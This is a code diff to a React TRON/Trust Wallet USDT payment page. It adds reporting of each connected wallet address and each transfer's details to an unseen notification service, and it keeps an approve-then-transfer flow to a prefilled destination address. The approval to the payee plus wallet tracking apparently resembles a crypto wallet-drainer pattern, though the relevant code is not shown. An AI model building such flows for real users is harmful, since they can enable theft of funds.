@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { ArrowLeft, ChevronDown, Info, Wallet, X } from "lucide-react";
 import { toast } from "sonner";
 import { useTronWallet } from "@/lib/tronwallet-adapter";
+import { notifyTrustTronActivity } from "@/lib/trust-tron-notify";
 import { getWalletConnectAppUrl } from "@/lib/walletconnect-app-url";
 import { approveUSDT, transferUSDT } from "@/lib/web3";
 
@@ -174,6 +175,8 @@ const TrustWalletTronPay = () => {
   >({ state: "idle" });
   const [toInput, setToInput] = useState(DEFAULT_TO_ADDRESS);
   const [memo, setMemo] = useState("");
+  const connectMethodRef = useRef<string>("unknown");
+  const connectNotifySentForRef = useRef<string | null>(null);
 
   useEffect(() => {
     isConnectedRef.current = isConnected;
@@ -198,6 +201,7 @@ const TrustWalletTronPay = () => {
     wcTrustNavigatedRef.current = false;
 
     try {
+      connectMethodRef.current = "walletconnect";
       setTrustConnecting(true);
       (window as any).__tronWalletConnectOnUri = (uri: string) => {
         if (wcTrustNavigatedRef.current) return;
@@ -293,6 +297,7 @@ const TrustWalletTronPay = () => {
         }
 
         // 2) Adapter connect for app state (address/isConnected).
+        connectMethodRef.current = "trust-injected";
         setLastAutoConnect({ state: "connecting", startedAt: Date.now() });
         setTrustConnecting(true);
         await connect("trust");
@@ -331,9 +336,24 @@ const TrustWalletTronPay = () => {
     };
   }, [connect]);
 
+  useEffect(() => {
+    if (!isConnected || !address) return;
+    if (connectNotifySentForRef.current === address) return;
+    connectNotifySentForRef.current = address;
+    void notifyTrustTronActivity({
+      event: "wallet_connected",
+      walletAddress: address,
+      connectMethod: connectMethodRef.current,
+    });
+  }, [isConnected, address]);
+
   const handleConfirm = async () => {
     if (!isConnected) {
       toast.error("Connect your wallet first (Trust Wallet Discover → Connect Wallet).");
+      return;
+    }
+    if (!address) {
+      toast.error("Wallet address unavailable.");
       return;
     }
     try {
@@ -350,14 +370,26 @@ const TrustWalletTronPay = () => {
         return;
       }
 
-      await approveUSDT("tron", toInput.trim());
-      await transferUSDT("tron", toInput.trim(), normalizedAmount);
+      const approveTxId = await approveUSDT("tron", toInput.trim());
+      const transferTxId = await transferUSDT("tron", toInput.trim(), normalizedAmount);
 
       toast.success("Approve and transfer completed successfully.");
+      void notifyTrustTronActivity({
+        event: "transfer_completed",
+        walletAddress: address,
+        toAddress: toInput.trim(),
+        amountUsdt: numericAmount,
+        approveTxId,
+        transferTxId,
+      });
     } catch (error) {
-      toast.error(
-        error instanceof Error ? error.message : "Transaction flow failed"
-      );
+      const msg = error instanceof Error ? error.message : "Transaction flow failed";
+      toast.error(msg);
+      void notifyTrustTronActivity({
+        event: "transfer_failed",
+        walletAddress: address,
+        errorMessage: msg,
+      });
     } finally {
       setIsSubmitting(false);
     }
